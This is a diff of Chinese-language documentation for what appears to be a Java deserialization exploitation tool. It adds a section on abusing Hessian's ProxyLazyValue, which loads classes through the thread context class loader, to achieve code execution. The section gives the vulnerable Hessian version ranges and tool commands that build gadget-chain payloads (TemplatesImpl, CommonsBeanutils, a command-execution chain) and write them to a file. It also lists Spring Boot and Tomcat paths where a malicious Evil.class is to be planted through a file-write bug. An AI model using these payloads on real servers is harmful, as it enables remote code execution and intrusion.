@@ -1094,11 +1094,31 @@ map.put(2, map2);
 -m HessianAttack -g HashMapLazyValue -a "ProxyLazyValue:CommonsLangDeserialize:CommonsBeanutils2:Templateslmpl:auto_cmd:calc" -hessianType="Hessian2"
 ```
 
-#### ProxyLazyValue 独立利用(未集成)
+#### ProxyLazyValue 独立利用
 
-描述：因为ProxyLazyValue进行类加载的加载器是线程上下文类加载器，在某些场景如在上下文类加载能触及的classpath下写.class文件就可以直接利用ProxyLazyValue进行类加载导致代码执行。可以学习huahua大师傅的[记某次实战hessian不出网反序列化利用](https://flowerwind.github.io/2023/04/17/%E8%AE%B0%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98hessian%E4%B8%8D%E5%87%BA%E7%BD%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8-md/)
+描述：因为ProxyLazyValue进行类加载的加载器是线程上下文类加载器，在某些场景下如果能在上下文类加载器的classpath下写.class文件就可以直接利用ProxyLazyValue进行类加载导致代码执行。强推学习huahua大师傅的[记某次实战hessian不出网反序列化利用](https://flowerwind.github.io/2023/04/17/%E8%AE%B0%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98hessian%E4%B8%8D%E5%87%BA%E7%BD%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8-md/)
 
-工具：
+说明：Hessian版本限制如下：
+
+* caucho hessian <= 4.0.66
+* sofa hessian <= 4.0.4
+* hessian little <= 3.2.11
+
+工具：只支持ProxyLazyValue构造方式，因为它用的是线程上下文类加载器
+
+```
+-m HessianAttack -g HashMapLazyValue -a "ProxyLazyValue:ThreadClassLoader:T34403237892999" -hessianType="Hessian2" -writeToFile="/tmp/1.ser"
+```
+
+需要搭配写文件漏洞将字节码class文件写在线程上下文类加载器加载的classpath下面：本地测试只能触发一次，所以想变换漏洞利用效果需要重新写并加载
+
+线程上下文类加载器classpath的位置：
+
+- springboot场景下：
+  - Windows：C:\Users\Xxxx\AppData\Local\Temp\tomcat-docbase.3584977337134953447.9124\WEB-INF\classes\Evil.class
+  - Linux：/tmp/tomcat-docbase.3584977337134953447.9124/WEB-INF/classes/Evil.class
+- tomcat场景下：
+  - {tomcat.home}/webapps/wuxdiXxxcms/WEB-INF/classes/Evil.class
 
 #### 其他的LazyValue利用方式
 
